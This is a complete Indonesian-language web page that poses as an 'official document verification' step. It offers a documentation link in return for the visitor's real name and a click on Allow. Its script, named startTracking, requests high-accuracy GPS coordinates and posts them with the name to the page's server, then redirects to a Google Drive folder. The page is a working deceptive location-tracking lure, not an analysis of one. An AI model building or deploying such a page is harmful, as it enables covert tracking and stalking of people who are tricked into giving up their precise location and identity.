<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi Akses</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      background: #000000;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    input {
      padding: 10px;
      font-size: 16px;
      width: 250px;
      margin-bottom: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>
  <h2>Verifikasi Dokumen Resmi</h2>
  <p>Klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
  <p>Klik Allow untuk mendapatkan Link.</p>
  <p>Mohon isi kolom dengan Nama Asli agar mudah dalam Pendataan üëçüëç</p>
  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/pocoyo-giphy2.gif?raw=true" alt="GiFOnline" width="400">
  <br><br>

  <input type="text" id="nama" placeholder="Masukkan Nama Anda" required><br>
  <button onclick="startTracking()">Dapatkan Link</button>

  <script>
    function startTracking() {
      var nama = document.getElementById("nama").value.trim();

      if (!nama) {
        alert("Nama belum diisi.");
        return;
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            sendData(position, nama);
          },
          showError,
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        alert("Browser Anda tidak mendukung GPS.");
      }
    }

    function sendData(position, nama) {
      fetch('/api/location', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          acc: position.coords.accuracy,
          nama: nama
        })
      })
      .then(response => {
        if (!response.ok) {
          console.error('Gagal kirim data:', response);
          alert('Gagal mengirim data ke server');
        } else {
          window.location.href = "https://drive.google.com/drive/folders/1xiz5IF0xhsMKqnol0cBrO8KWScXV7cd-?usp=sharing";
        }
      })
      .catch(error => {
        console.error('Terjadi kesalahan saat fetch:', error);
        alert('Terjadi kesalahan, silakan coba lagi!');
      });
    }

    function showError(error) {
      switch(error.code) {
        case error.PERMISSION_DENIED:
          alert("Klik Izinkan agar dapat direct ke Link Dokumentasi.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("Informasi lokasi tidak tersedia.");
          break;
        case error.TIMEOUT:
          alert("Waktu permintaan lokasi habis.");
          break;
        case error.UNKNOWN_ERROR:
          alert("Terjadi kesalahan tak terduga.");
          break;
      }
    }
  </script>
</body>
</html>
